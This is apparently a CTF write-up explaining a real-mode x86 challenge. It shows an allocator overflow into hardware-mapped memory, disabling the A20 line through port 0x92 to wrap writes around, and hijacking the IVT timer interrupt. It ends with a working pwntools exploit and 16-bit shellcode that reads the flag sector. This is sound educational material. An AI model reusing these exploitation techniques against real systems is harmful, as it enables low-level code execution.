+++
title = 'down-the-line - TRX CTF Quals 2026'
date = 2026-04-26T12:24:29+02:00
draft = false
author = 'leave'
summary = 'real mode challenge that I wrote for TRX CTF Quals 2026'
tags = [
    'real mode',
    'x86'
]
toc = true
+++

## Description
I guess you'll have to settle for just four ports...

## What is "real mode"?
Real mode, or real address mode, is the first CPU mode of operations of x86 processors. It is based on 16-bits registers and a 20-bits address space. It only uses segmentations with no privilege model, so all memory is **rwx** and with the highest privileges. Nowadays x86 processor still runs real mode code at boot-time (and other contexts like **smm**). <br>

Segmentation in real mode is based on segment registers: **cs** for the code, **ss** for the stack, **ds** for the code, and other general purpose segments like **es**. <br>
The addressing is done by multiplying by 0x10 the segment register and adding the register, for example the instruction pointer, stated by `cs:ip` becomes `cs*0x10 + ip`. Accessing the `ip` registers implies `cs:ip`, `sp` and `bp` with `ss` and `bs`, `si` and `di` with `ds`; other registers cannot be used to address memory. To use `es` it must be explicited, like `es:di`. <br>
This allows an address space of 20-bits. <br>

What happens with a pair like: 0xffff:0x10? The addressed memory is 0x100000, which goes over the 20-bits limit. <br>
Originally it would cause a wrap around to address 0, but Intel decided to implement another bus, the so called **A20** line, to actually address another bit of memory. <br>
It turns out that some developer were using the wrap around as a feature, so the sudden presence of the A20 line would break their code. Therefore Intel decided to give the chance to disable it. <br>

After the firmware executes the start up routines, the execution is passed to the boot-loader, stored in the first cylinder, first head, first sector (aka first 0x200 bytes) of the disk and loaded in memory at address **0x7c00**. <br>

More theory at: https://wiki.osdev.org/Real_Mode

## Sorry for the asm...
The challenge implements a simple allocator supporting 16 slots of memory. <br>
Instead of saving the actual pointer to the allocated memory, it stores a segment pointer; same goes for the sizes, which represents the number of 16 bytes blocks. A pair of pointer 0x1000 and size 0x10 grants memory from address 0x10000 to 0x10100. <br>
The chunks are given by fragmentating memory from address 0x10000 to 0xfffff (segments from 0x1000 to 0xffff). <br>

The challenge allows to allocate memory, write data in it and print it to a whatever serial port or to the last one used. The "last used port" is stored after the allocatable memory. <br>

## The vulnerability
![ranges](/images/down_the_line/ranges.png)

Not all memory is free to use! <br>
In particular we can see two big interesting sections: the **EBDA** and the **Upper Memory**. <br>
As the image shows, the upper memory is hardware mapped, which means it cannot be rewritten; see it as read-only physical memory. <br>
The intended solution leverages the hardware mapped memory, but the **EBDA** too may have some shenanigans. <br>

## The exploit
The allocation flow is:
```asm
.alloc:
    cmp byte [INDEX], N
    je _end

    mov ax, SIZE_PROMPT
    call interact
    
    push ax
    call save_ptr  
    pop ax  
    call save_size

    inc byte [INDEX]
    jmp .main
```

- `save_ptr` checks if the pointers array got already allocated, if it hasn't, it allocates it on the heap and then allocates the actual user chunk;
- `save_size` check if the sizes array got already allocated, if it hasn't, it allocates it on the heap and then populate the entry with the size.

So after the first allocation the layout is:
 - pointers array;
 - user memory;
 - sizes array;
 - heap.

We can allocate a chunk with a specific size that forces the sizes array to end up on upper memory, so that when the sizes get written, the values actually don't change, granting a buffer overflow. <br>

We can exploit the bof by overwriting the "last used port" and set it to port 0x92:

![port](/images/down_the_line/0x92.png)

Bit 1 is pretty interesting: by toggling it we can disable the A20 line! <br>
So if we:
 - bof on the cached port to set it to 0x92;
 - write 0 to port 0x92;
 - bof again -> now the bof will wrap around to address 0.

If you look back at the memory layout you'll see that at address 0 there's the **IVT**, the real mode version of the modern **IDT**. <br>
The **IVT** is a list of `cs:ip` pairs which point to the functions responsible to handle each interrupt. <br>
So if we can overwrite it we can hijack the control flow, and given that all memory is rwx we can jump directly to our data and get shellcode. <br>
The **IVT** entry I exploited is the interrupt #8, which is the **PIC** timer interrupt that gets thrown by the CPU at constant intervals. <br>

The flag is in the first cylinder, first head, second sector of the disk, we can user int 0x13 to read it. <br>

## Final exploit
```py
#!/usr/bin/env python3
from pwn import *
import sys

context.terminal = ["pwntools-terminal"]

host, port = sys.argv[1].split(":")

from pwnlib.tubes.tube import tube
tube.s		= tube.send
tube.sa		= tube.sendafter
tube.sl		= tube.sendline
tube.sla	= tube.sendlineafter
tube.r		= tube.recv
tube.ru		= tube.recvuntil
tube.rl		= tube.recvline
tube.rls	= tube.recvlines

aleak = lambda elfname, addr: log.info(f"{elfname} @ 0x{addr:x}")	# addr leak (bases)
vleak = lambda valname, val: log.info(f"{valname}: 0x{val:x}")	# val leak (canary)
bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
chunks = lambda data, step: [data[i:i+step] for i in range(0, len(data), step)]

GDB_SCRIPT = """
"""

def conn():
	if args.LOCAL:
		return process(["./run.sh"])
	if args.GDB:
		return gdb.debug(["./run.sh"], gdbscript=GDB_SCRIPT)
	return remote(host, int(port), ssl=True)


def alloc(io, size):
	io.sa(b"> ", b"1\r")
	io.sa(b"> ", bstr(size) + b"\r")

def edit(io, index, data):
	io.sa(b"> ", b"2\r")
	io.sa(b"> ", bstr(index) + b"\r")
	io.sa(b"> ", data)

def show(io, index, port):
	io.sa(b"> ", b"3\r")
	io.sa(b"> ", bstr(index) + b"\r")
	io.sa(b"> ", bstr(port) + b"\r")


def main():
	io = conn()

	alloc(io, 0xc000-0x1000-1)
	alloc(io, 0xfff)
	alloc(io, 0xfffe-0xd000)
	alloc(io, 1)

	edit(io, 3, pack(0x92, 16)*(0xca0//2))
	show(io, 0, 0)

	with open("shellcode.bin", "rb") as f:
		shellcode = f.read()
	payload = flat({0x20: shellcode, 0x40: pack(0, 16) + pack(0, 16)})	# int8
	edit(io, 3, payload)

	io.recvuntil(b"TRX{")
	print(b"TRX{" + io.recvuntil(b"}"))

	io.close()

if __name__ == "__main__":
	main()
```

```asm
bits 16

_start:
    mov ax, 0
    mov es, ax
    mov bx, 0x1000

    mov cx, 2
    mov ax, 0x202
    dec ax
    xor dh, dh
    mov dl, 0x80
    int 0x13

    mov dx, 0x3f8
loop:
    mov al, [bx]
    out dx, al
    inc bx
    jmp loop
```